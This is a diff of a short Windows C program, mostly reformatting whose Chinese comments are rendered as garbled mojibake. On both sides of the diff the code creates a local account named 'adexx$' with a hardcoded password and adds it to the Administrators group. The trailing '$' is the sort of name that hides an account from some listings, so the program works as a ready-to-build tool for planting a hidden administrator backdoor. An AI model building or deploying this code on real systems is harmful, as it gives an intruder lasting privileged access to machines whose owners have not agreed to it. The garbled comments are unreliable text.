@@ -1,52 +1,50 @@
-#ifndef UNICODE    
-#define UNICODE    
-#endif    
-#include<stdio.h>  
-#include<windows.h>  
-#include<lm.h>  
-#pragma comment(lib,"netapi32")
+#ifndef UNICODE
+#define UNICODE
+#endif
+#include <stdio.h>
+#include <windows.h>
+#include <lm.h>
+#pragma comment(lib, "netapi32")
 int wmain(int argc, wchar_t *argv[])
 {
-	// ¶¨ÒåUSER_INFO_1½á¹¹Ìå
-	USER_INFO_1 ui;
-	DWORD dwError = 0;
-	//Ð¡±Ê¼Ç LPWSTR ÊÇ wchar_t *   £¬ L"zzzhh" ÀàÐÍÊÇconst wchar_t[6] ¿ÉÒÔÒþÊ½×ª»»Îªconst whcar_t *
-	wchar_t username[] = L"adexx$";
-	ui.usri1_name = username;            // ÕË»§   
-	wchar_t password[] = L"adexx!@#QWE";
-	ui.usri1_password = password;      // ÃÜÂë
-	ui.usri1_priv = USER_PRIV_USER;
-	ui.usri1_home_dir = NULL;
-	ui.usri1_comment = NULL;
-	ui.usri1_flags = UF_SCRIPT;
-	ui.usri1_script_path = NULL;
-	//Ìí¼ÓÃûÎªadexxµÄÓÃ»§,ÃÜÂëÎªp@adexx!@#QWE
-	if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
-	{
+    // ï¿½ï¿½ï¿½ï¿½USER_INFO_1ï¿½á¹¹ï¿½ï¿½
+    USER_INFO_1 ui;
+    DWORD dwError = 0;
+    //Ð¡ï¿½Ê¼ï¿½ LPWSTR ï¿½ï¿½ wchar_t *   ï¿½ï¿½ L"zzzhh" ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½const wchar_t[6] ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê½×ªï¿½ï¿½Îªconst whcar_t *
+    wchar_t username[] = L"adexx$";
+    ui.usri1_name = username; // ï¿½Ë»ï¿½
+    wchar_t password[] = L"adexx!@#QWE";
+    ui.usri1_password = password; // ï¿½ï¿½ï¿½ï¿½
+    ui.usri1_priv = USER_PRIV_USER;
+    ui.usri1_home_dir = NULL;
+    ui.usri1_comment = NULL;
+    ui.usri1_flags = UF_SCRIPT;
+    ui.usri1_script_path = NULL;
+    //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îªadexxï¿½ï¿½ï¿½Ã»ï¿½,ï¿½ï¿½ï¿½ï¿½Îªp@adexx!@#QWE
+    if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
+    {
 
-		MessageBox(0, L"successfully", L"title", 0);
+        MessageBox(0, L"successfully", L"title", 0);
+    }
+    else
+    {
+        //ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½
+        MessageBox(0, L"fail", L"title", 0);
+    }
 
-	}
-	else
-	{
-		//Ìí¼ÓÊ§°Ü    
-		MessageBox(0, L"fail", L"title", 0);
+    // ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½administratorsï¿½ï¿½
+    LOCALGROUP_MEMBERS_INFO_3 account;
+    account.lgrmi3_domainandname = ui.usri1_name;
+    if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
+    {
+        //ï¿½ï¿½ï¿½Ó³É¹ï¿½
+        MessageBox(0, L"Add to Administrators success", L"title", 0);
+    }
+    else
+    {
+        //ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½
+        MessageBox(0, L"Add to Administrators Fail!", L"title", 0);
+    }
 
-	}
-
-	// Ìí¼ÓÓÃ»§µ½administrators×é
-	LOCALGROUP_MEMBERS_INFO_3 account;
-	account.lgrmi3_domainandname = ui.usri1_name;
-	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
-	{
-		//Ìí¼Ó³É¹¦    
-		MessageBox(0, L"Add to Administrators success", L"title", 0);
-	}
-	else
-	{
-		//Ìí¼ÓÊ§°Ü    
-		MessageBox(0, L"Add to Administrators Fail!", L"title", 0);
-	}
-
-	return 0;
+    return 0;
 }
